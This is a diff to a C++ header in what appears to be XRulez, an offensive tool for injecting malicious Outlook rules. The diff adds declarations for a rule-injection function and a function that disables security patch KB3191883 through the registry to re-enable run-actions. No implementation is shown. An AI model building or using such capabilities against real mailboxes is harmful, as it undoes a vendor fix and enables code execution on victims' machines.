@@ -60,6 +60,14 @@ namespace XRulez
 		/// @see HandleSingleCommand.
 		bool ExeProcessCommandLineValues();
 
+		/// Injects the malicious rule.
+		/// @return true if succeeded to inject the rule.
+		bool PerformInjection();
+
+		/// Disables security patch KB3191883 (re-enables run-actions for Outlook 2010, 2013 and 2016).
+		/// @return false if couldn't modify registry.
+		bool ExeDisableSecurityPatchKB3191883();
+
 		/// Another executable command line processing helper function. Handles one single command-line command. Should not be called from DLL builds.
 		/// @param commandKey name-part the a command to process.
 		/// @param commandValue value-part the a command to process.
